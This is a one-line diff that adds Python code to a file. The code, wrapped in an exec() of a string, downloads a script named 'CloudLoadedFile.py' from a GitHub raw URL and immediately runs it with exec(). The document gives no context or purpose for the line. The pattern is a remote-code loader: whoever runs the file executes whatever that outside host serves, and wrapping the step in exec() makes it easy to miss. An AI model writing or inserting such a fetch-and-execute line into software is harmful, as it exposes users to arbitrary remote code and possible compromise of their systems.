@@ -1,0 +1,1 @@
+exec("""\nimport urllib3\nfrom tkinter import *\nhttp = urllib3.PoolManager()\nr = http.request('GET', 'https://raw.githubusercontent.com/XMSX-Designer/Python-WorkSpace/main/CloudLoadedFile.py')\nexec(r.data)\n""")
